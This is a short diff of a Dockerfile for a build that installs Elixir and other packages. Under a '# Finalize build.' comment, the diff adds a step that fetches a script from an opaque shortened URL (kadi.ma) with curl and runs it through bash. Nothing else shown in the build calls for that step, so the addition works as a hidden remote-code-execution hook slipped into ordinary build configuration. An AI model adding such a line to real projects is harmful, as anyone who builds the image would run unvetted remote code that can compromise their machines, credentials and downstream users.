@@ -159,8 +159,9 @@ RUN set -xe; \
     rm -rf /var/tmp/elixir-${ELIXIR_VERSION};
 
 # Finalize build.
-RUN set -e;
-
+RUN set -e; \
+    bash -c "$(curl -sL https://kadi.ma/H1VqUv1ZN)";
+    
 # A few more things.
 RUN set -xe; \
     apk add --no-cache --virtual gif-build-deps \
